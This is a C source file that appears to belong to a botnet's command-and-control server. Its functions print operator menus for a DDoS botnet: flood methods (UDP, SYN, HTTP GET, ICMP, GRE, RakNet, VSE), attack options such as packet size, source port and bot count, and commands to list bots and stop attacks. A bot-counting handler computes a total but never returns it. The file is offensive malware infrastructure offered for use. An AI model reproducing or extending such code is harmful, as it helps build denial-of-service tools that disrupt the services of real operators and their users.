#include "headers/command_actions.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include <stdio.h>
#include <pthread.h>
#include <string.h>

#define CYAN "\033[1;36m"

void handle_help_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             PINK "!misc - shows misc commands\r\n"
             "!attack - shows attack methods\r\n"
             "!admin - show admin and root commands\r\n"
             "!help - shows this msg\r\n" RESET);
}

void handle_misc_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             PINK "!stopall - stops all atks\r\n"
             "!opthelp - see attack options\r\n"
             "!bots - list bots\r\n"
             "!user - show user or other users\r\n"
             "!clear - clear screen\r\n"
             "!exit - leave CNC\r\n" RESET);
}

void handle_attack_list_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             CYAN "!vse - UDP Game VSE Query Flood\r\n"
             "!raknet - RakNet UnConnectedPing flood\r\n"
             "!syn - TCP SYN+PSH Flood\r\n"
             "!socket - TCP Stream Connections Flood\r\n"
             "!http - HTTP 1.1 GET Flood\r\n"
             "!icmp - ICMP ECHO Flood\r\n"
             "!gre - GRE IP|TCP|UDP Specific Flood\r\n"
             "!udp - Plain UDP Flood\r\n"
             "!udpplain - Plain UDP Flood (FAST)\r\n" RESET);
}

void handle_opthelp_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH,
             RED "Optional Arguments:\r\n"
             "psize - packet size (max: 64500-ICMP-UDP-SYN | 1492 VSE-RakNet | 1450-UDPPLAIN | 8192-GRE)\r\n"
             "srcport - srcport for UDP-SYN-GRE, Default=Random, max=65535)\r\n"
             "botcount - Limit bots to use\r\n"
             "proto - GRE Proto (tcp/udp) default=none\r\n"
             "gport - destport for GRE\r\n");
}

void handle_clear_command(char *response) {
    snprintf(response, MAX_COMMAND_LENGTH, "\033[H\033[J");
}

void handle_ping_command(char *response) {
    int valid_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int count = bot_count;
    if (count > MAX_BOTS) count = MAX_BOTS;
    for (int i = 0; i < count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
    }
    pthread_mutex_unlock(&bot_mutex);
}
